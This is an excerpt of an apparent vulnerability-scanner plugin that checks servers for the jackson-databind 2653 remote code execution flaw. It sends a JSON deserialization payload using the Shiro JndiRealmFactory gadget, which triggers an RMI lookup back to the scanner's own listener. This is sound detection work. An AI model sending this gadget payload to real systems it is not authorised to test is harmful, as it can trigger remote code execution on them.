...
if (description)
{
  script_id(51799256);
  script_version("1.3");
  script_name(english:"FasterXML jackson-databind 2653 RCE");
  script_summary(english:"FasterXML jackson-databind 2653 RCE");
  script_set_attribute(attribute:"description", value:"FasterXML jackson-databind 2.x before 2.9.10.4 mishandles the interaction between serialization gadgets and typing, related to org.apache.shiro.realm.jndi.JndiRealmFactory.");
...
function check_local_ping(port){
	...
	var postdata = '{"@type":"org.apache.shiro.realm.jndi.JndiRealmFactory", "jndiNames":["rmi://'+ laddress +':'+ bind_port +'/Exploit"], "Realms":[""]}';
    i = 0;
	argv[i++] = "iptables";        
	argv[i++] = "-I";
	argv[i++] = "INPUT";
    ...
    if ("JRMI" >< curl_response && "K" >< curl_response){
	    return {'vuln':true, 'report':"FasterXML jackson-databind 2653 RCE"};
	} 
